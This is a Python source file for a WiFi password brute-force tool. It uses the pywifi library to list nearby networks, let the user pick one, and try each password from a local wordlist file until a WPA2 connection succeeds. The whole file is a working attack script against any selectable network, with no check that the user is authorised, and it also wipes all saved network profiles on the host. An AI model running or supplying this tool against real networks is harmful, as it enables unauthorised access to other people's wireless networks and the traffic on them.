import pywifi
import time

class WifiBruteforce:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]

    def display_initial_message(self):
        # Display initial message in the terminal (Dog face ASCII art)
        initial_message = r"""
        / \__
       (    @\___
        /         O
       /   (_____/
      /_____/  U
        """
        print(initial_message)

    def list_wifi(self):
        scan_results = self.iface.scan_results()
        unique_ssids = set(result.ssid for result in scan_results if result.ssid)
        print("Available WiFi Networks:")
        for i, ssid in enumerate(unique_ssids, 1):
            print(f"{i}. {ssid}")

    def connect_and_bruteforce(self, ssid_index):
        scan_results = self.iface.scan_results()
        unique_ssids = set(result.ssid for result in scan_results if result.ssid)
        valid_ssid_indices = [i for i, ssid in enumerate(unique_ssids, 1) if ssid]

        if 1 <= ssid_index <= len(valid_ssid_indices):
            selected_ssid_index = valid_ssid_indices[ssid_index - 1]
            selected_ssid = list(unique_ssids)[selected_ssid_index - 1]
            print(f"Selected WiFi Network: {selected_ssid}")

            abc_file_path = self.get_file_path('pass.txt')
            password_list = []

            try:
                with open(abc_file_path, 'r') as file:
                    password_list = [line.strip() for line in file]
            except FileNotFoundError:
                print("File Not Found")
                return

            for password in password_list:
                print(f"Trying password: {password}")
                result = self.connect_wifi(selected_ssid, password)
                if result == "Connected":
                    print(f"Connected to {selected_ssid} with password: {password}")
                    break
            else:
                print("Bruteforce attack unsuccessful. No correct password found.")

        else:
            print("Invalid serial number. Please choose a valid serial number.")

    def connect_wifi(self, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)

        time.sleep(5)  # Wait for the connection to establish

        if self.iface.status() == pywifi.const.IFACE_CONNECTED:
            return "Connected"
        else:
            return "Failed"

    def get_file_path(self, filename):
        return filename  # Assuming the file is in the same directory as the script

if __name__ == "__main__":
    wifi_bruteforce = WifiBruteforce()

    # Display initial message with dog image representation
    wifi_bruteforce.display_initial_message()

    # Step 1: List available WiFi networks
    wifi_bruteforce.list_wifi()

    # Step 2: Prompt user to choose a network by entering its serial number
    selected_ssid_index = int(input("Enter the serial number of the WiFi network you want to connect to: "))

    # Step 3: Connect and perform bruteforce attack
    wifi_bruteforce.connect_and_bruteforce(selected_ssid_index)
